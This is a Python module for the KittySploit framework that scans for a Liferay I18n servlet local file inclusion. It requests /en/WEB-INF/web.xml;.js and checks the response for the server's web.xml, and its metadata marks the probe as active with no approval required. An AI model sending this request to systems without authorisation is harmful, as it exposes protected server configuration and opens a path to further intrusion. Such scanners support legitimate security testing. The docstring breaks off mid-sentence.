#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Liferay is vulnerable to local file inclusion in the I18n Servlet because it leaks information via sending an ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Liferay - Local File Inclusion Detection',
        'description': 'Liferay is vulnerable to local file inclusion in the I18n Servlet because it leaks information via sending an HTTP request to /[language]/[resource];.js (also .jsp works).',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'liferay', 'lfi', 'j2ee', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/ilmila/J2EEScan/blob/master/src/main/java/burp/j2ee/issues/impl/LiferayI18nServletResourceLeaks.java',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/en/WEB-INF/web.xml;.js', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<web-app id=', '<?xml',)
        header_any = ('application/xml',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="Liferay - Local File Inclusion detected",
                path='/en/WEB-INF/web.xml;.js',
            )
            return True
        return False

